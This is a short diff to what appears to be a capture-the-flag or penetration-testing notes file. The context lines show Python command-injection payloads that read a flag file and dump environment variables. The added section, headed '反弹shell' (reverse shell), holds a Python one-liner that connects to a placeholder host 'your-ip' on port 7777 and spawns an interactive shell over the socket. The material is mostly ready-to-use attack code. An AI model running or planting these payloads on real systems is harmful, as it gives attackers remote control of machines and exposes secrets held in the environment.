@@ -55,6 +55,10 @@ os.popen("cat /this_is_the_flag.txt").read()
 
 __import__('os').popen("env").read()
 ```
+反弹shell
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-ip",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
 
 
 
